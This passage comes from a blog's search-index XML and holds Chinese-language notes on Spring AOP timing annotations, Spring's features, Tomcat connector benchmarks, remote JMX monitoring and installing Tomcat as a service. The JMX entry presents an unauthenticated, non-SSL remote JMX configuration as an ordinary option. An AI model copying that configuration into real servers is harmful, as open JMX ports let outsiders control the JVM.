 import java.lang.annotation.*;@Retention(RetentionPolicy.RUNTIME)@Target(ElementType.METHOD)@Inheritedpublic @interface MetricTime {    String value() default "";}


定义切面
 import com.local.configuration.annotation.MetricTime;import lombok.extern.slf4j.Slf4j;import org.aspectj.lang.ProceedingJoinPoint;import org.aspectj.lang.annotation.Around;import org.aspectj.lang.annotation.Aspect;import org.springframework.context.annotation.Configuration;import java.time.Duration;import java.time.Instant;@Slf4j@Aspect@Configurationpublic class MetricAspect {    @Around("@annotation(metricTime)")    public Object metric(ProceedingJoinPoint proceedingJoinPoint, MetricTime metricTime) throws Throwable {        System.out.println("Around.begin.............");        Instant start = Instant.now();        try {            return proceedingJoinPoint.proceed();        } finally {            long spend = Duration.between(start, Instant.now()).toMillis();            System.out.printf("[Metrics][%s]-消耗：%d 毫秒", metricTime.value(), spend);            System.out.println("Around.end.............");        }    }}


在需要被监控的关键方法上标注该注解
 import com.local.configuration.annotation.MetricTime;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.ResponseBody;import java.util.stream.Collectors;import java.util.stream.IntStream;@Controllerpublic class ConfigController {    @ResponseBody    @MetricTime("aop")    @GetMapping("/aop/test")    public Long testAopSpend() {        return IntStream.rangeClosed(1, 100).boxed().collect(Collectors.summingLong(e -&gt; Long.valueOf(e)));    }}


启动类上标注@EnableAspectJAutoProxy
 @EnableAspectJAutoProxy@SpringBootApplicationpublic class ConfigurationApplication {    public static void main(String[] args) {        SpringApplication.run(ConfigurationApplication.class, args);    }}


AspectJ定义AOP装配规则



装配规则
说明




“execution(public * com.itranswarp.learnjava.service..(…))”
某个service包下面的所有Bean的所有方法都会被拦截


“execution(public * update*(…))”
方法名前缀进行拦截。这种非精准打击误伤面更大，因为从方法前缀区分是否是数据库操作是非常不可取的。







AOP 可能造成的空指针
参考：https://www.liaoxuefeng.com/wiki/1252599548343744/1339039378571298

Spring通过CGLIB创建的代理类，不会初始化代理类自身继承的任何成员变量，包括final类型的成员变量！

]]></content>
      <categories>
        <category>Spring</category>
        <category>Spring Framework</category>
      </categories>
      <tags>
        <tag>Spring Framework</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring基础</title>
    <url>/20230319/d607e27b.html</url>
    <content><![CDATA[Spring的特性和优势

Spring Framework有哪些特性，用了这个框架对开发而言有什么好处呢？

从Spring 框架的特性来看：

非侵入式：基于Spring开发的应用中的对象可以不依赖于Spring的API
控制反转：IOC——Inversion of Control，指的是将对象的创建权交给 Spring 去创建。使用 Spring 之前，对象的创建都是由我们自己在代码中new创建。而使用 Spring 之后。对象的创建都是给了 Spring 框架。
依赖注入：DI——Dependency Injection，是指依赖的对象不需要手动调用 setXX 方法去设置，而是通过配置赋值。
面向切面编程：Aspect Oriented Programming——AOP
容器：Spring 是一个容器，因为它包含并且管理应用对象的生命周期
组件化：Spring 实现了使用简单的组件配置组合成一个复杂的应用。在 Spring 中可以使用XML和Java注解组合这些对象。
一站式：在 IOC 和 AOP 的基础上可以整合各种企业应用的开源框架和优秀的第三方类库（实际上 Spring 自身也提供了表现层的 SpringMVC 和持久层的 Spring JDBC）

从使用Spring 框架的好处看：

Spring 可以使开发人员使用 POJOs 开发企业级的应用程序。只使用 POJOs 的好处是你不需要一个 EJB 容器产品，比如一个应用程序服务器，但是你可以选择使用一个健壮的 servlet 容器，比如 Tomcat 或者一些商业产品。
Spring 在一个单元模式中是有组织的。即使包和类的数量非常大，你只要担心你需要的，而其它的就可以忽略了。
Spring 不会让你白费力气做重复工作，它真正的利用了一些现有的技术，像 ORM 框架、日志框架、JEE、Quartz 和 JDK 计时器，其他视图技术。
测试一个用 Spring 编写的应用程序很容易，因为环境相关的代码被移动到这个框架中。此外，通过使用 JavaBean-style POJOs，它在使用依赖注入注入测试数据时变得更容易。
Spring 的 web 框架是一个设计良好的 web MVC 框架，它为比如 Structs 或者其他工程上的或者不怎么受欢迎的 web 框架提供了一个很好的供替代的选择。MVC 模式导致应用程序的不同方面(输入逻辑，业务逻辑和UI逻辑)分离，同时提供这些元素之间的松散耦合。模型(Model)封装了应用程序数据，通常它们将由 POJO 类组成。视图(View)负责渲染模型数据，一般来说它生成客户端浏览器可以解释 HTML 输出。控制器(Controller)负责处理用户请求并构建适当的模型，并将其传递给视图进行渲染。
Spring 对 JavaEE 开发中非常难用的一些 API（JDBC、JavaMail、远程调用等），都提供了封装，使这些API应用难度大大降低。
轻量级的 IOC 容器往往是轻量级的，例如，特别是当与 EJB 容器相比的时候。这有利于在内存和 CPU 资源有限的计算机上开发和部署应用程序。
Spring 提供了一致的事务管理接口，可向下扩展到（使用一个单一的数据库，例如）本地事务并扩展到全局事务（例如，使用 JTA）

]]></content>
      <categories>
        <category>Spring</category>
        <category>Spring Framework</category>
      </categories>
      <tags>
        <tag>Spring Framework</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat基础</title>
    <url>/20221030/530cfffd.html</url>
    <content><![CDATA[Tomcat的四种基于HTTP协议的Connector性能比较
今天在osc上看到对Tomcat的四种基于HTTP协议的Connector性能比较
具体内容如下：
&lt;Connector port="8081" protocol="org.apache.coyote.http11.Http11NioProtocol" connectionTimeout="20000" redirectPort="8443"/&gt;&lt;Connector port="8081" protocol="HTTP/1.1" connectionTimeout="20000" redirectPort="8443"/&gt;&lt;Connector port="8081" protocol="HTTP/1.1" executor="tomcatThreadPool" connectionTimeout="20000" redirectPort="8443" /&gt;&lt;Connector port="8081" protocol="org.apache.coyote.http11.Http11NioProtocol" executor="tomcatThreadPool" connectionTimeout="20000"  redirectPort="8443" /&gt;
我们姑且把上面四种Connector按照顺序命名为 NIO, HTTP, POOL, NIOP
为了不让其他因素影响测试结果，我们只对一个很简单的jsp页面进行测试，这个页面仅仅是输出一个Hello World。假设地址是 http://tomcat1/test.jsp
我们依次对四种Connector进行测试，测试的客户端在另外一台机器上用ab命令来完成，
测试命令为： ab -c 900 -n 2000 http://tomcat1/test.jsp ，
最终的测试结果如下表所示(单位:平均每秒处理的请求数)：



NIO
HTTP
POOL
NIOP




281
65
208
365


666
66
110
398


692
65
66
263


256
63
94
459


440
67
145
363


NIO方式波动很大，但没有低于280 的
Tomcat的默认配置HTTP的性能是很稳定，但是也是最差的
而POOL方式则波动很大，测试期间和HTTP方式一 样，不时有停滞
NIOP是在NIO的基础上加入线程池，可能是程序处理更复杂了，因此性能不见得比NIO强



由于linux的内核默认限制了最大打开文件数目是1024，因此此次并发数控制在900。
尽管这一个结果在实际的网站中因为各方面因素导致，可能差别没这么大，例如受限于数据库的性能等等的问题。
但对我们在部署网站应用时还是具有参考价值的。
&lt;Connector executor="tomcatThreadPool" port="8090" redirectPort="8443" protocol="org.apache.coyote.http11.Http11NioProtocol" compression="on" compressionMinSize="2048" enableLookups="false" acceptCount="1000" URIEncoding="UTF-8" connectionTimeout="40000" /&gt;



说明
参数




连接器使用的线程池的名子
executor=“tomcatThreadPool”


连接器端口
port=“8090”


连接器使用的传输方式
protocol=“org.apache.coyote.http11.Http11NioProtocol”


传输时是否支持压缩
compression=“on”


压缩的大小
compressionMinSize=“2048”



&lt;Executor name="tomcatThreadPool" namePrefix="catalina-exec-" maxThreads="800" minSpareThreads="400" maxSpareThreads="700" /&gt;



线程池名
name=“tomcatThreadPool”




线程前缀
namePrefix=“catalina-exec-”


最大产生线程数
maxThreads=“800”


最小初始线程数
minSpareThreads=“400”


最大初始线程数
maxSpareThreads=“700”



Tomcat开启JMX监控
背景：Tomcat系统运行过程出现错误，需要打开JMX，添加对JVM的监控。Tomcat运行在CentOS中。
前提：监控端windows系统，安装JDK。


服务器关闭Tomcat
 cd /opt/apache-tomcat-7.0.54/bin./shutdown.sh


进入Tomcat/bin目录，修改catalina.sh，找到如下内容“#—–Execute The Requested Command”，在其上添加以下配置，此配置不需要用户名、密码
CATALINA_OPTS=”$CATALINA_OPTS-Dcom.sun.management.jmxremote-Djava.rmi.server.hostname=192.168.23.1-Dcom.sun.management.jmxremote.port=9999-Dcom.sun.management.jmxremote.ssl=false-Dcom.sun.management.jmxremote.authenticate=false”



参数
说明




ip
是你要监控的tomcat所在服务器的ip地址。


端口号
是你要开启的监控端口号。


ssl
false表示不使用ssl链接。


authenticate
false表示不使用监控,即不需要用户名和密码



以下方式需要配置用户名、密码
CATALINA_OPTS=”$CATALINA_OPTS-Dcom.sun.management.jmxremote-Djava.rmi.server.hostname=192.168.23.1-Dcom.sun.management.jmxremote.port=9999-Dcom.sun.management.jmxremote.ssl=false-Dcom.sun.management.jmxremote.authenticate=true-Dcom.sun.management.jmxremote.password.file=../conf/jmxremote.password-Dcom.sun.management.jmxremote.access.file=../conf/jmxremote.access”



参数
说明




authenticate
true开启鉴权功能


access.file
权限文件路径


password.file
密码文件路径





当没有配置密码时，无需此操作。当启用密码后，根据上述配置，将 JAVA_HOME/jre/lib/management下面的jmxremote.access和jmxremote.password.template拷贝到Tomcat的conf目录下，并对两个文件做以下修改：
jmxremote.password.template文件名修改为jmxremote.password
修改两个文件的权限


chmod 600 jmxremote.accesschmod 600 jmxremote.password
修改jmxremote.access文件，将文件最后两行显示【monitorRole和controlRole】的注释取消，
其中monitorRole为只拥有只读权限的角色，
controlRole有更高权限：读写等。编辑完成后，保存。

修改jmxremote.password文件。同样将文件最后两行显示【monitorRole和controlRole】的注释取消，两个用户名后面的字符即密码，然后保存。



服务器启动Tomcat
 cd /opt/apache-tomcat-7.0.54/bin./startup.sh


做完以上操作后，使用jdk自带工具jvisualvm.exe连接，工具目录如下：JAVA_HOME/bin，连接方式如下：
右击“远程”，“添加远程主机”


​	    
右击添加好的主机，“添加JMX连接”，根据配置信息，填写相应的端口、用户名、密码等信息

  

添加完成后，效果如下：

​     

如有其他需求，可下载其他附件


如果需要独立的监控软件可下载：VisualVM
下载地址：http://visualvm.github.io/download.html
入门指南：https://visualvm.github.io/gettingstarted.html?VisualVM_1.3.9
Tomcat的连接数与线程池
参考： https://www.cnblogs.com/kismetv/p/7806063.html
Tomcat 配置文件server.xml
参考： https://www.cnblogs.com/kismetv/p/7228274.html
]]></content>
      <categories>
        <category>框架|中间件</category>
        <category>Tomcat</category>
      </categories>
      <tags>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>安装Tomcat服务</title>
    <url>/20221030/6f43f742.html</url>
    <content><![CDATA[Window安装Tomcat 为服务
cd /tomcat/bin,service.bat install
$CATALINA_HOME：为系统环境变量。查看方式
windows： echo %CATALINA_HOME% linux ：  echo $CATALINA_HOME
输入localhost:8080默认访问的是$CATALINA_HOME/webapps/ROOT
]]></content>
      <categories>
        <category>框架|中间件</category>
        <category>Tomcat</category>
      </categories>
      <tags>
        <tag>Tomcat</tag>
      </tags>
  </entry>
</search>
